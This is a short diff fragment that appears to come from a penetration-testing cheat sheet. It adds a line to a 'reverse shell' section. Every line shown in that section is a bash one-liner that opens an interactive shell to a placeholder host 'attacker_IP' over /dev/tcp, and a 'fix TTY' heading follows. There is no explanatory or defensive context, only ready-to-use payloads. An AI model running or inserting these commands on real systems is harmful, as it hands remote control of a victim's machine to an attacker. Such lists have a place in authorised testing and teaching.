@@ -444,6 +444,7 @@ return some_value_here
 # reverse shell
 bash -i >& /dev/tcp/attacker_IP/port_here 0>&1
 0<&1;exec 1<>/dev/tcp/attacker_IP/port_here; bash <&1 >&1 2>&1
+bash -c 'bash -i >& /dev/tcp/attacker_IP/port_here 0>&1'
 
 # fix TTY
 ## background reverse shell
